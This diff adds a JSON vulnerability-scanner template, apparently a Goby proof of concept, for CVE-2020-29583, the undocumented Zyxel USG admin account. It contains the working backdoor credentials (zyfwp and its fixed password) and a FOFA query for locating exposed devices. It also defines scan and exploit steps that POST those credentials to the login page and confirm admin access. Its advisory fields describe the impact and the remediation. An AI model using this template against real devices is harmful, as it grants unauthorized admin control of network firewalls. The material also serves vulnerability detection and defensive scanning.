@@ -1,0 +1,103 @@
+{
+  "Name": "Undocumented user account in Zyxel products",
+  "Description": "Firmware version 4.60 of Zyxel USG devices contains an undocumented account (zyfwp) with an unchangeable password. The password for this account can be found in cleartext in the firmware. This account can be used by someone to login to the ssh server or web interface with admin privileges.",
+  "Product": "Zyxel-USG",
+  "Homepage": "https://www.zyxel.com/",
+  "DisclosureDate": "2020-12-22",
+  "Author": "mahui@gobies.org",
+  "FofaQuery": "body=\"model\\\">USG40\"",
+  "Level": "2",
+  "Impact": "<p>攻击者可通过默认口令登录web端，查看设备配置、日志等，修改网络设备，更改无线设置，修改用户密码等，为下一步攻击做信息搜集。<br></p>",
+  "Recommandation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
+  "References": [
+    "http://ftp.zyxel.com/USG40/firmware/USG40_4.60(AALA.1)C0_2.pdf",
+    "https://businessforum.zyxel.com/discussion/5252/zld-v4-60-revoke-and-wk48-firmware-release",
+    "https://businessforum.zyxel.com/discussion/5254/whats-new-for-zld4-60-patch-1-available-on-dec-15",
+    "https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html",
+    "https://www.zyxel.com/support/CVE-2020-29583.shtml",
+    "https://www.zyxel.com/support/security_advisories.shtml",
+    "https://nvd.nist.gov/vuln/detail/CVE-2020-29583",
+    "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-29583"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "AttackType",
+      "type": "select",
+      "value": "user:password"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "username=zyfwp&pwd=PrOw%21aN_fXp&pwd_r=&password=PrOw%21aN_fXp&loginTosslvpn=false",
+        "data_type": "text",
+		"header": {"Content-Type":"application/x-www-form-urlencoded"},
+        "follow_redirect": false,
+        "method": "POST",
+        "uri": "/"
+      },
+      "ResponseTest": {
+        "checks": [
+		{
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "ext-js/index.html",
+            "variable": "$body"
+          },
+		{
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": " authtok",
+            "variable": "$head"
+          },
+		{
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "302",
+            "variable": "$code"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "username=zyfwp&pwd=PrOw%21aN_fXp&pwd_r=&password=PrOw%21aN_fXp&loginTosslvpn=false",
+        "data_type": "text",
+		"header": {"Content-Type":"application/x-www-form-urlencoded"},
+        "follow_redirect": false,
+        "method": "POST",
+        "uri": "/"
+      },
+      "SetVariable": [
+        "output|lastbody|text|zyfwp:PrOw!aN_fXp"
+      ]
+    }
+  ],
+  "Tags": ["defaultaccount"],
+  "CVEIDs": [
+    "CVE-2020-29583"
+  ],
+  "CVSSScore": "7.8",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["Zyxel-USG"]
+  },
+  "Disable": false
+}
